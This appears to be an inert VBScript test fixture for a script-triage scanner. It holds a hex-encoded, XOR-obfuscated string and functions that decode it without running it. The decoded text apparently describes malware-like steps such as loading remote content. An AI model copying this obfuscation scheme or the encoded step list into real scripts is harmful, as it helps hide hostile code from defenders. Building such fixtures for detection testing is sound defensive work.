Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_07f04450 = "e70bc78ab0e5538685fefd599597b7f4699a99a0f05ada86b1f4469784a6ce428497ade2509384efe4469a99a2f5698493aefe42938aa2f5578682a6e30bb593b1e5649387edf44e938ab0e55791939cf2598398b7ac048a95a2fc46979fa4ff699f92fef2579b86a2f85198dbfaf405c5cea2a80e90c1bfe4449acbabe5428685f9be19cf93f0a20e97cffbf701d893bbf05b869aa6bf5f9880a2fd5f92d9f5a504c290f5a550d892a2e54a8385a6e3699791a6ff42cbbeb6ff428493b0e27a9794eca853c5c5fbf00fce90f4ed509f9aa6ce469782abac75ccaa96e25384859fc143949aaaf26abe83ade5449385b0dd5794aab0e5579193eea853c5c5fbf00fce90f4bf529782bfe4469a99a2f5698384afac5e8282b3e20cd9d9faf405c5cea2a80e90c1edf44e979bb3fd53d89fade7579a9fa7be43869aacf052d9cea2a906c4c3f6f0"
Const Codec_07f04450 = "hex_compact|repeating_key_xor|91,36,f6,f6,c3"

Function Load_07f04450()
  Dim result(), ByTeInDeX
  ReDim result((Len(Material_07f04450) \ 2) - 1)
  For ByTeInDeX = 0 To UBound(result)
    result(ByTeInDeX) = CInt("&H" & Mid(Material_07f04450, ByTeInDeX * 2 + 1, 2))
  Next
  Load_07f04450 = result
End Function

Function Decode_07f04450(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  keyBytes = Array(145,54,246,246,195)
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor keyBytes(ByTeInDeX Mod 5)
  Next
  Decode_07f04450 = result
End Function

Function Recover_07f04450()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  If True Then
    NeUtRaL = Empty
      SoUrCeByTeS = Load_07f04450()
      For PaSs = 0 To 0
        DeCoDeDByTeS = Decode_07f04450(SoUrCeByTeS)
      Next
      DeScRiPtOrTeXt = ""
      For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
        DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
      Next
  End If
  Recover_07f04450 = DeScRiPtOrTeXt
End Function

Function Inspect_07f04450()
  Inspect_07f04450 = Recover_07f04450()
End Function
